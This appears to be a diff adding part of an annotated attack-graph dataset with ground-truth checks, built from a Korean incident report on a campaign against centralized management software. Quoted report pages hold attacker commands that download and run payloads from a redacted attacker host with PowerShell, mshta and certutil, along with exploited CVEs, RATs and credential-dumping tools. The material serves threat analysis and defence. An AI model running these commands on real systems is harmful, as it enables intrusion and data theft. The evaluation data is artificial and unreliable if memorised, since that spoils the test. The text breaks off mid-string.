+      "relationships": "captures(F12 → F19)",
+      "report_pages": [
+        {
+          "page_number": 25,
+          "text": "Command and Control\nProxy: Internal Proxy\n공격자는 내부에서 특정 단말기를 통해 감염된 다수 단말기로 명령어를 전달하는 방식을 사용하였\n다. 최초 실행시 설정하는 명령제어지를 제외하고, 다수 단말기에 명령제어를 수행하기 위하여IP 리\n스트를 전달하는 방식으로 구현하였다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 25"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Screen Capture"
+      },
+      "requirements": [
+        {
+          "type": "fact",
+          "fact_id": "F12",
+          "name": "host.rat.path",
+          "description": "다운로드·실행된 RAT 로컬 경로(c:\\users\\public\\mscert.exe 등)",
+          "is_external": false,
+          "level": "report_explicit",
+          "inferred_flag": false
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F19",
+          "name": "host.screen.capture_image",
+          "description": "JPEG 화면 캡처 이미지(명령 31, image_jpeg_Encode)"
+        }
+      ]
+    },
+    {
+      "node_id": "N14",
+      "tactic": "Command and Control",
+      "technique_id": "T1090.001",
+      "technique_name": "Proxy: Internal Proxy",
+      "behavior_summary": "IP 리스트 전달 방식의 프록시 악성코드로 다수 단말 제어",
+      "relationships": "establishes(F12 → —)",
+      "report_pages": [
+        {
+          "page_number": 25,
+          "text": "Command and Control\nProxy: Internal Proxy\n공격자는 내부에서 특정 단말기를 통해 감염된 다수 단말기로 명령어를 전달하는 방식을 사용하였\n다. 최초 실행시 설정하는 명령제어지를 제외하고, 다수 단말기에 명령제어를 수행하기 위하여IP 리\n스트를 전달하는 방식으로 구현하였다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 25"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Proxy: Internal Proxy"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C09",
+          "operator": "AND",
+          "label": "내부 프록시를 통한 다수 단말 명령 제어에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F09",
+              "name": "host.target.ip_list",
+              "description": "내부 프록시 명령 전달 대상 단말 IP 리스트",
+              "is_external": true,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F10",
+              "name": "attacker.c2.address",
+              "description": "RAT가 접속하는 C2 주소(net_Dial, 포트 8088)",
+              "is_external": true,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F12",
+              "name": "host.rat.path",
+              "description": "다운로드·실행된 RAT 로컬 경로(c:\\users\\public\\mscert.exe 등)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            }
+          ]
+        }
+      ],
+      "parsers": []
+    },
+    {
+      "node_id": "N15",
+      "tactic": "Exfiltration",
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "behavior_summary": "악성코드 명령(51)으로 파일을 C2 채널로 유출(FileDownload)",
+      "relationships": "exfiltrates(F18 → F20), exfiltrates(F19 → F20)",
+      "report_pages": [
+        {
+          "page_number": 26,
+          "text": "Exfiltrate\nExfiltration Over C2 Channel\n공격자는 Collection 단계를 통해 본인이 원하는 파일 정보를 획득, 명령어(51)을 통해 파일을 읽고\nC2 채널로 송부하도록 악성코드를 구현하였다. 참고로 악성코드 내에서 송부하는 함수명은\nFileDownload라고 명명되어 있다. File Upload가 아니라 File Download라는 이름을 통해 우리\n는 공격자의 관점에서 악성코드가 구현되어 있음을 알 수 있다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 26"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Exfiltration Over C2 Channel"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C11",
+          "operator": "AND",
+          "label": "C2 채널 정보 유출에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F10",
+              "name": "attacker.c2.address",
+              "description": "RAT가 접속하는 C2 주소(net_Dial, 포트 8088)",
+              "is_external": true,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F12",
+              "name": "host.rat.path",
+              "description": "다운로드·실행된 RAT 로컬 경로(c:\\users\\public\\mscert.exe 등)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "combine",
+              "combine_id": "C10",
+              "operator": "OR",
+              "label": "C2로 유출할 수집 데이터(파일 목록 또는 화면 캡처)",
+              "members": [
+                {
+                  "type": "fact",
+                  "fact_id": "F18",
+                  "name": "host.file.inventory",
+                  "description": "수집한 드라이브·폴더·파일 목록(명령 61·62 결과)",
+                  "is_external": false,
+                  "level": "report_explicit",
+                  "inferred_flag": false
+                },
+                {
+                  "type": "fact",
+                  "fact_id": "F19",
+                  "name": "host.screen.capture_image",
+                  "description": "JPEG 화면 캡처 이미지(명령 31, image_jpeg_Encode)",
+                  "is_external": false,
+                  "level": "report_explicit",
+                  "inferred_flag": false
+                }
+              ]
+            }
+          ]
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F20",
+          "name": "attacker.c2.exfiltrated_data",
+          "description": "C2 채널로 유출된 파일 데이터(명령 51, FileDownload)"
+        }
+      ]
+    },
+    {
+      "node_id": "N28",
+      "tactic": "Exfiltration",
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "behavior_summary": "피해 서버 탈취 자료를 xampp로 구축한 임대서버 웹경로에 적재",
+      "relationships": "exfiltrates(F20 → F27)",
+      "report_pages": [
+        {
+          "page_number": 12,
+          "text": "Exfiltration\nExfiltration Over C2 Channel\n공격자는 임대한 서버에 xampp 도구를 이용하여 웹페이지를 구축하였다. 이 웹페이지는 피해 기\n업에서 유출한 데이터를 업로드하는 용도로 사용했다.\n데이터 유출 과정\n유출된 파일들은 주로 기술 연구소의 데이터로, 이를 통해 공격자들이 특히 국내 기술 분야에 대한\n정보를 탈취하는 데 주력하고 있음을 알 수 있다. 또한, 피해 기업의 인사 정보와 EML 파일 등도 탈\n취되었는데, 이는 공격자들이 기업의 내부 정보에 대한 깊은 이해를 위해 노력하고 있음을 시사한\n다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 12"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Exfiltration Over C2 Channel"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C14",
+          "operator": "AND",
+          "label": "임대서버 웹경로 자료 적재에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F20",
+              "name": "attacker.c2.exfiltrated_data",
+              "description": "C2 채널로 유출된 파일 데이터(명령 51, FileDownload)",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F21",
+              "name": "attacker.rental_server.host",
+              "description": "가상자산 결제로 임대한 국내 호스팅 서버",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            }
+          ]
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F27",
+          "name": "attacker.web_path.staged_data",
+          "description": "xampp 임대서버 웹경로에 적재된 유출 자료"
+        }
+      ]
+    },
+    {
+      "node_id": "N29",
+      "tactic": "Exfiltration",
+      "technique_id": "T1567.002",
+      "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+      "behavior_summary": "웹경로 적재 자료를 DropBox에 업로드",
+      "relationships": "exfiltrates(F27 → F28)",
+      "report_pages": [
+        {
+          "page_number": 13,
+          "text": "유출된 자료의 일부\nExfiltration Over Web Service: Exfiltration to Cloud Storage\n임대 서버 브라우저 로그를 분석한 결과, 피해기업으로부터 탈취한 정보는 DropBox에 업로드되었\n다.\n침해사고\nTTP\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 13"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+      },
+      "requirements": [
+        {
+          "type": "fact",
+          "fact_id": "F27",
+          "name": "attacker.web_path.staged_data",
+          "description": "xampp 임대서버 웹경로에 적재된 유출 자료",
+          "is_external": false,
+          "level": "report_explicit",
+          "inferred_flag": false
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F28",
+          "name": "attacker.cloud.exfiltrated_data",
+          "description": "DropBox에 업로드된 유출 자료"
+        }
+      ]
+    }
+  ],
+  "facts": {
+    "F01": {
+      "fact_id": "F01",
+      "name": "target.host.ip",
+      "description": "스캐닝으로 식별된 외부 노출 피해 호스트 IP",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 6,
+          "text": "print(f\"{i}. {ip}\")\nexcept requests.exceptions.RequestException as e:\nprint(f\"{i}. {ip}\")\ndef write_to_file(file, content):\nwith open(file, 'a') as f:\nf.write(content + '\\n')\nif __name__ == \"__main__\":\nif len(sys.argv) != 3:\nprint(\"Usage: python program.py ip_list_file output_file\")\nelse:\nip_list_file = sys.argv[1]\noutput_file = sys.argv[2]\nprocess_ip_list(ip_list_file, output_file)\nSearch Open Websites/Domains: Search Engines\n공격자는 구글 검색 엔진을 활용하여 다양한 정보를 탐색하였다. 이 과정에서 영어와 한국어를 혼합\n하여 검색어를 입력하였다. 이는 공격자가 다양한 언어를 사용하여 정보를 수집하려 노력한 것으로\n보인다. 또한 공격자의 브라우저 언어 설정이 중국어로 되어 있었는데, 이는 공격자가 중국어를 사\n용하는 지역에서 활동하거나 중국어를 이해할 수 있다는 점을 시사한다.\n임대서버에서 사용한 브라우저\n공격자가 사용한 검색어 중 일부는 네이버나 카카오톡 같은 국내 서비스의 휴대폰 인증을 우회하려\n는 시도를 보여준다. 또한, 그들이 일으킨 침해사고에 대한 분석 보고서를 검색하는 활동도 진행하\n고 있다. 이러한 검색 활동 분석을 통해 공격자의 관심사나 목표를 파악할 수 있다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 6"
+        },
+        {
+          "page_number": 17,
+          "text": "소스코드 확보 및 취약점 개발\n두 번째로, 피해를 입은 업체에서 운영 중인 중앙관리형 솔루션들은 대부분 외부 인터넷에 프로그램\n의 포트가 열려있는 채로 방치되어 있었다. 따라서 공격자가 제작한 스캐닝 프로그램에 의해 포트가\n외부에 개방된 상태로 운영되고 있는 시스템들은 모두 침해를 당하였다.\n취약점 스캐닝\n세 번째로, 발견된 대부분의 제로데이 취약점은 인증 우회와 관련이 있었다. 관리자 권한 없이 계정\n정보가 담긴 파일에 접근이 가능하여 손쉽게 관리자 계정을 탈취한 경우도 있었고, 인증과정 없이\n계정을 생성하거나 명령 실행이 가능했던 경우도 있었다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 17"
+        }
+      ],
+      "producers": [
+        "N18"
+      ],
+      "consumers": [
+        "N01"
+      ]
+    },
+    "F02": {
+      "fact_id": "F02",
+      "name": "target.management_solution.endpoint",
+      "description": "외부에 포트가 열린 중앙 관리 솔루션 콘솔/오픈 DB 포트",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 6,
+          "text": "print(f\"{i}. {ip}\")\nexcept requests.exceptions.RequestException as e:\nprint(f\"{i}. {ip}\")\ndef write_to_file(file, content):\nwith open(file, 'a') as f:\nf.write(content + '\\n')\nif __name__ == \"__main__\":\nif len(sys.argv) != 3:\nprint(\"Usage: python program.py ip_list_file output_file\")\nelse:\nip_list_file = sys.argv[1]\noutput_file = sys.argv[2]\nprocess_ip_list(ip_list_file, output_file)\nSearch Open Websites/Domains: Search Engines\n공격자는 구글 검색 엔진을 활용하여 다양한 정보를 탐색하였다. 이 과정에서 영어와 한국어를 혼합\n하여 검색어를 입력하였다. 이는 공격자가 다양한 언어를 사용하여 정보를 수집하려 노력한 것으로\n보인다. 또한 공격자의 브라우저 언어 설정이 중국어로 되어 있었는데, 이는 공격자가 중국어를 사\n용하는 지역에서 활동하거나 중국어를 이해할 수 있다는 점을 시사한다.\n임대서버에서 사용한 브라우저\n공격자가 사용한 검색어 중 일부는 네이버나 카카오톡 같은 국내 서비스의 휴대폰 인증을 우회하려\n는 시도를 보여준다. 또한, 그들이 일으킨 침해사고에 대한 분석 보고서를 검색하는 활동도 진행하\n고 있다. 이러한 검색 활동 분석을 통해 공격자의 관심사나 목표를 파악할 수 있다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 6"
+        },
+        {
+          "page_number": 17,
+          "text": "소스코드 확보 및 취약점 개발\n두 번째로, 피해를 입은 업체에서 운영 중인 중앙관리형 솔루션들은 대부분 외부 인터넷에 프로그램\n의 포트가 열려있는 채로 방치되어 있었다. 따라서 공격자가 제작한 스캐닝 프로그램에 의해 포트가\n외부에 개방된 상태로 운영되고 있는 시스템들은 모두 침해를 당하였다.\n취약점 스캐닝\n세 번째로, 발견된 대부분의 제로데이 취약점은 인증 우회와 관련이 있었다. 관리자 권한 없이 계정\n정보가 담긴 파일에 접근이 가능하여 손쉽게 관리자 계정을 탈취한 경우도 있었고, 인증과정 없이\n계정을 생성하거나 명령 실행이 가능했던 경우도 있었다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 17"
+        },
+        {
+          "page_number": 24,
+          "text": "중앙 집중형 관리 솔루션을 통한 악성코드 유포 과정\nCollection\nData from Local System\n악성코드의 명령(61)에 의해 논리적 드라이브의 정보를 확보한 공격자는 추가적인 명령(62)을 통\n해 모든 폴더와 파일 정보를 획득한다.\nScreen Capture\n악성코드의 명령(31)에 의해 감염단말기의 스크린을 캡쳐, 성공하면 공격자에게 JPEG 포맷의 캡쳐\n된 화면 데이터를 송부한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 24"
+        }
+      ],
+      "producers": [
+        "N18"
+      ],
+      "consumers": [
+        "N01",
+        "N11"
+      ]
+    },
+    "F03": {
+      "fact_id": "F03",
+      "name": "attacker.exploit.code",
+      "description": "침투용 공개 CVE·제로데이 익스플로잇(CVE-2023-42793 등)",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 9,
+          "text": "앙 집중형 관리 솔루션들이었다. 이런 솔루션들은 대부분 웹 기반의 UI를 가지고 있어, 침해한 서버\n로부터 소스 코드를 쉽게 확보할 수 있다. 따라서 공격자는 침투에 성공한 피해 기업으로부터 솔루\n션의 코드를 확보한 후, 임대 서버에 설치하여 취약점 테스트 및 개발을 진행할 수 있었다.\n중앙 집중형 관리 솔루션은 내부 시스템들에 파일 배포 및 실행이 가능하여 악성코드의 내부 전파를\n쉽게 할 수 있다. 따라서, 이러한 솔루션들이 더욱 주요한 공격 대상이었을 것이다.\n중앙 집중형 관리 솔루션의 취약점 개발 과정\nObtain Capabilities: Malware\n공격을 수행하기 위해 필요한 도구들이 각 임대서버에서 발견되었다. 이러한 도구들의 사용 목적은\n다양하며, 원격제어부터 웹페이지 구축, 웹 침투 테스트, 네트워크 트래픽 모니터링, 코드 개발, 가\n상머신 운영 등의 기능을 수행하였다. 이렇게 공격자의 임대 서버에서 발견된 다양한 도구들은 공격\n자의 공격 방법론과 전략을 이해하는 데 중요한 단서를 제공한다.\n로그에서 확인된 사용\n도구 기능\n목적\n무작위 대입 공격에 사\nWebPageLogin_BruteForce 무작위 대입 공격\n용\n무작위 대입 공격에 사\nTITAN_PRIVAT 무작위 대입 공격\n용\n무작위 대입 공격에 사\nMassscan 무작위 대입 공격\n용\n피해 시스템 제어에 사\nAmmyRAT 원격제어\n용\nVenomRat 원격제어 피해시스템 제어에 사용\nWarzoneRat 원격제어 피해시스템 제어에 사용\n图形化渗透测试武器库 모의해킹 도구 -\n(Graphica Penetration Testing\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 9"
+        },
+        {
+          "page_number": 10,
+          "text": "로그에서 확인된 사용\n도구 기능\n목적\nWeapon Library)\nNetsarang Xshell에 저장된\nXdecrypt -\nCredential을 추출\nObtain Capabilities: Exploits\n임대서버에서 발견된 공격자가 사용한 공개된 취약점 코드는 아래와 같다. 공격자들이 Windows\n용 소프트웨어와 Linux용 소프트웨어의 취약점을 모두 활용하고 있음으로써, 운영 체제를 구분하\n지 않고 다양한 시스템을 대상으로 공격하고 있다는 것을 알 수 있다.\n도구 기능 로그에서 확인된 사용 목적\nWindows Print Spooler 서비스의 권한상승 취\nPrintSpoofer 피해 시스템 공격에 사용\n약점\nCVE2023 JetBrains Teamcity에서 발생하는 원격 코드 실\n피해 시스템 공격에 사용\n42793 행 취약점\nCVE2023 PaperCut MF 및 NG 소프트웨어에서 발행하는\n피해 시스템 공격에 사용\n27350 원격 코드 실행 취약점\nCVE2021 Zoho ManagerEngine ADSelfService Plus에\n피해 시스템 공격에 사용\n40539 서 발생하는 인증 우회 및 원격 코드실행 취약점\nCVE2023 Zoho ManagerEngine ADManager Plus에서\n피해 시스템 공격에 사용\n38743 발생하는 원격명령 실행 취약점\nCVE2023\nCraft CMS에서 발생하는 원격 코드 실행 취약점 피해 시스템 공격에 사용\n41892\nCVE2023 Atlassian Confluence Data Center와 Server\n피해 시스템 공격에 사용\n22515 에서 발생하는 접근제어 취약점\nCVE2023 OpenSSH의 ssh-agent 포워딩 기능에서 발생\n피해 시스템 공격에 사용\n38408 하는 원격 코드 실행 취약점\nObtain Capabilities: Tool\n공격자 임대서버에서 발견된 도구는 아래와 같다.\n도구 기능 로그에서 확인된 사용 목적\nSunlogin 원격제어 임대서버 제어에 사용\nPSEXESVC 원격제어 피해시스템 제어에 사용\nphpstudy 웹페이지 구축 -\nxampp 웹페이지 구축 피해기업의 자료유출에 사용\nAcunetix 웹 침투 테스트 -\nBurp Suite Professional 2022 v3.6 웹 침투 테스트 -\nWPS Office 중국 문서 프로그램 -\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 10"
+        },
+        {
+          "page_number": 11,
+          "text": "도구 기능 로그에서 확인된 사용 목적\nObsidian 마크다운 에디터 -\nTypora 마크다운 에디터 -\nWireshark 네트워크 트래픽 모니터링 -\nProxifier 프록시 -\nv2rayN 프록시 -\nCCProxy 프록시 -\nSharpReverseProxy 리버스 프록시 -\nbore-v0.5.0 리버스 프록시 -\nloclx 리버스 프록시 -\nVisual Studio Code 코드 개발 -\nVisualGet 매크로 개발 -\nNavicat Premium 16 MySQL 관리 피해시스템 제어에 사용\n임대서버 내에 있는 데이터 보호\nVeraCrypt 디스크 암호화\n에 사용\n공격자끼리 연락에 사용\nTelegram 메신저\n데이터 유출에 사용\nQQ 메신저 공격자끼리 연락에 사용\nEveryThing 파일 검색 -\nMotrix 파일 다운로드 매니저 -\nInternet Download Manager 파일 다운로드 매니저 -\n취약점 테스트용 가상이미지 구\nVirtualBox 가상머신\n동에 사용\ngo-memexec 메모리 실행 라이브러리 악성코드 제작에 사용\nMemorySharp 메모리 편집 라이브러리 악성코드 제작에 사용\n시스템에 저장중인 패스워드(브\nProtected Storage PassView -\n라우져)를 출력\nInstant Messenger Password 메신저 애플리케이션의 사용자\n-\nRecovery Tool 계정 비밀번호를 복구\nDefense Evasion\nObfuscated Files or Information\n공격자는 공격을 위해 필요한 다양한 자원들을 보관하고 있는 특정 드라이브를 암호화하였다. 이 드\n라이브에는 공격에 필요한 해킹 도구, 원격제어 악성코드, 취약점 테스트용 가상머신 등 중요한 정\n보가 담겨 있었다.\n암호화에 사용된 도구는 VeraCrypt이라는 알려진 암호화 도구이다. 이 도구는 드라이브 전체를 효\n과적으로 암호화하여 외부의 접근을 차단하는데 사용된다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 11"
+        },
+        {
+          "page_number": 17,
+          "text": "소스코드 확보 및 취약점 개발\n두 번째로, 피해를 입은 업체에서 운영 중인 중앙관리형 솔루션들은 대부분 외부 인터넷에 프로그램\n의 포트가 열려있는 채로 방치되어 있었다. 따라서 공격자가 제작한 스캐닝 프로그램에 의해 포트가\n외부에 개방된 상태로 운영되고 있는 시스템들은 모두 침해를 당하였다.\n취약점 스캐닝\n세 번째로, 발견된 대부분의 제로데이 취약점은 인증 우회와 관련이 있었다. 관리자 권한 없이 계정\n정보가 담긴 파일에 접근이 가능하여 손쉽게 관리자 계정을 탈취한 경우도 있었고, 인증과정 없이\n계정을 생성하거나 명령 실행이 가능했던 경우도 있었다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 17"
+        },
+        {
+          "page_number": 24,
+          "text": "중앙 집중형 관리 솔루션을 통한 악성코드 유포 과정\nCollection\nData from Local System\n악성코드의 명령(61)에 의해 논리적 드라이브의 정보를 확보한 공격자는 추가적인 명령(62)을 통\n해 모든 폴더와 파일 정보를 획득한다.\nScreen Capture\n악성코드의 명령(31)에 의해 감염단말기의 스크린을 캡쳐, 성공하면 공격자에게 JPEG 포맷의 캡쳐\n된 화면 데이터를 송부한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 24"
+        }
+      ],
+      "producers": [
+        "N23",
+        "N25"
+      ],
+      "consumers": [
+        "N01",
+        "N11",
+        "N27"
+      ]
+    },
+    "F04": {
+      "fact_id": "F04",
+      "name": "attacker.c2.url",
+      "description": "악성코드 다운로드용 공격자 HTTP URL(http://[공격자IP]/icon/...)",
+      "is_external": true,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 18,
+          "text": "공격에 성공한 공격자는 중앙 관리 솔루션의 정책 배포 기능 등을 이용하여 추가로 내부에 악성 코\n드를 전파하였다. 이를 통해, 공격자는 시스템 내부에 더욱 깊숙히 침투하고, 더 넓은 범위의 피해를\n입힐 수 있었다.\nExecution\nCommand and Scripting Interpreter: Powershell\n파워쉘로 실행한 명령어의 일부는 아래와 같다. 모두 외부 시스템로부터 악성코드를 다운로드 받는\n명령이었다.\n공격자\npowershell wget -Uri hxxp://[ IP]/icon/favicon.ico -OutFile c:\\\n공격자\npowershell wget -Uri http://[ IP]/venus.asp -OutFile c:\\\\users\\\n공격자\npowershell mshta http://[ IP]/icon/icon.html\n공격자\npowershell wget -Uri http://[ IP]/icon/cert.txt -OutFile c:\\use\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\nCommand and Scripting Interpreter: Windows Command Shell\n최초 침투에 성공한 공격자가 사용한 명령어의 일부는 아래와 같다. 악성코드를 외부 시스템으로부\n터 다운로드 받는 명령과 탈취한 계정의 권한, 디렉토리 검색과 같은 정보 검색 명령이 주를 이루었\n다.\nipconfig\ndir c:\\\ndir \"c:\\\\Program Files\"\n공격자\npowershell \"wget -Uri http://[ IP]/icon/favicon.ico -OutFile c\npowershell c:\\users\\public\\mscert.exe\n공격자\npowershell \"(New-Object Net.WebClient).DownloadFile(\\'http://[\nwmic process get caption,processid,executablepath,commandline /for\nwmic process get executablepath\ncertutil -decode c:\\users\\public\\cert.txt c:\\users\\public\\mscert.e\ncertutil -decode c:\\users\\public\\cert.txt c:\\users\\public\\game.exe\ndel /f c:\\users\\public\\cert.txt c:\\users\\public\\test.txt\n'whoami > \"c:\\inetpub\\wwwroot\\test.txt\nnet user\nipconfig /all\nsysteminfo\ntasklist\ndir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test.txt\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 18"
+        },
+        {
+          "page_number": 19,
+          "text": "dir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test1.txt\npowershell \"net user\" > c:\\inetpub\\wwwroot\\test.txt\ndir \"c:\\inetpub\\wwwroot\\down\"\ndir \"c:\\users\\\"\ndir \"c:\\users\\administrator\"\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nnetstat -naop tcp | findstr ESTA\nquery session\ndir c:\\*\ntasklist > c:\\inetpub\\wwwroot\\a.txt\npowershell ls c:\\\ncmd.exe -c dir c:\\*\ntaskkill /f /im cmd.exe\n공격자\npowershell \"wget -Uri http://[ IP]/venus.asp -OutFile c:\\users\\\n공격자\ncertutil.exe -urlc\"\"\"\"\"\"ache -split -f http://[ IP]/venus.asp c\nren x:\\inetpub\\wwwroot\\venus.asp x:\\inetpub\\wwwroot\\wwinstallguide\nPersistence\nServer Software Component: Web Shell\n침투에 성공한 공격자는 지속성 유지를 위해 운영체제 명령 실행이 가능한 웹셸을 생성하였다. 웹\n셸의 사용자 인터페이스는 테스트 코드처럼 보이도록 디자인되어, 악성 파일로 의심받는 것을 회피\n하려는 의도가 있었다.\n공격자 사용 웹셸 화면\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 19"
+        }
+      ],
+      "producers": [],
+      "consumers": [
+        "N02",
+        "N03"
+      ]
+    },
+    "F05": {
+      "fact_id": "F05",
+      "name": "attacker.malware.binary",
+      "description": "개발·입수한 악성 바이너리(RAT 등, mscert.exe·game.exe)",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 8,
+          "text": "에 기존에 사용하지 않았던 신종 악성코드를 개발, 활용하는 모습을 보였다. 특히 이전과 달리, 기존\n부터 활용하던 악성코드 대비 신종 악성코드를 사용하는 비율이 월등히 높은 모습을 보인다.\n공격자는 C/C, .NET 악성코드에 더하여 Golang으로 작성한 악성코드를 적극적으로 개발, 사\n용하고 있으며 그 비율은 더 높아지고 있다. 이는 Golang의 개발 편의성과 더불어 동일코드로 멀티\n플랫폼 환경에서의 동작을 지원한다는 특수성으로 보인다. 따라서, 향후 리눅스나 맥 환경에서 동작\n하는 Golang 악성코드를 해당 공격그룹이 사용할 것이며, 공격타겟 또한 넓어질 것을 내포한다.\nRDPRemote Desktop Protocol) 캐시의 일부에서는 main.go라는 파일명의 코드를 개발 중인\n모습을 확인하였다. 이는 공격자가 직접 코드를 개발하고 있음을 나타낸다.\nmain.go 코드 개발 정황\n공격자들은 이러한 도구 개발을 위해 여러 자료를 참조하였다. 특히, Go 언어로 된 악성 코드를 개\n발하기 위해 공개된 GitHub 저장소를 참조하였으며, 제작한 악성 코드가 탐지되지 않도록 하기 위\n해 메모리에서 실행되는 기법에 대해 검색하였다.\nGitHub의 go-memexec 접속 기록\n마찬가지로 공격자들은 효과적인 공격 수행을 위해 Dll Injection 기법에 대한 테스트를 진행하였\n다. 이 기법은 악성 코드를 대상 프로세스의 메모리 공간에 삽입하여 실행하는 방법으로, 공격자가\n시스템을 더욱 깊숙히 조종할 수 있게 해준다.\nDLL Injection 테스트 파일\nDevelop Capabilities: Exploits\n해당 공격 그룹은 국내 소프트웨어의 제로데이 취약점에 대해 많은 연구를 진행하였다. 취약점 테스\n트의 대상이 된 소프트웨어는 주로 자산 관리 솔루션, 문서 관리 솔루션, 패치 관리 솔루션 등의 중\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 8"
+        },
+        {
+          "page_number": 10,
+          "text": "로그에서 확인된 사용\n도구 기능\n목적\nWeapon Library)\nNetsarang Xshell에 저장된\nXdecrypt -\nCredential을 추출\nObtain Capabilities: Exploits\n임대서버에서 발견된 공격자가 사용한 공개된 취약점 코드는 아래와 같다. 공격자들이 Windows\n용 소프트웨어와 Linux용 소프트웨어의 취약점을 모두 활용하고 있음으로써, 운영 체제를 구분하\n지 않고 다양한 시스템을 대상으로 공격하고 있다는 것을 알 수 있다.\n도구 기능 로그에서 확인된 사용 목적\nWindows Print Spooler 서비스의 권한상승 취\nPrintSpoofer 피해 시스템 공격에 사용\n약점\nCVE2023 JetBrains Teamcity에서 발생하는 원격 코드 실\n피해 시스템 공격에 사용\n42793 행 취약점\nCVE2023 PaperCut MF 및 NG 소프트웨어에서 발행하는\n피해 시스템 공격에 사용\n27350 원격 코드 실행 취약점\nCVE2021 Zoho ManagerEngine ADSelfService Plus에\n피해 시스템 공격에 사용\n40539 서 발생하는 인증 우회 및 원격 코드실행 취약점\nCVE2023 Zoho ManagerEngine ADManager Plus에서\n피해 시스템 공격에 사용\n38743 발생하는 원격명령 실행 취약점\nCVE2023\nCraft CMS에서 발생하는 원격 코드 실행 취약점 피해 시스템 공격에 사용\n41892\nCVE2023 Atlassian Confluence Data Center와 Server\n피해 시스템 공격에 사용\n22515 에서 발생하는 접근제어 취약점\nCVE2023 OpenSSH의 ssh-agent 포워딩 기능에서 발생\n피해 시스템 공격에 사용\n38408 하는 원격 코드 실행 취약점\nObtain Capabilities: Tool\n공격자 임대서버에서 발견된 도구는 아래와 같다.\n도구 기능 로그에서 확인된 사용 목적\nSunlogin 원격제어 임대서버 제어에 사용\nPSEXESVC 원격제어 피해시스템 제어에 사용\nphpstudy 웹페이지 구축 -\nxampp 웹페이지 구축 피해기업의 자료유출에 사용\nAcunetix 웹 침투 테스트 -\nBurp Suite Professional 2022 v3.6 웹 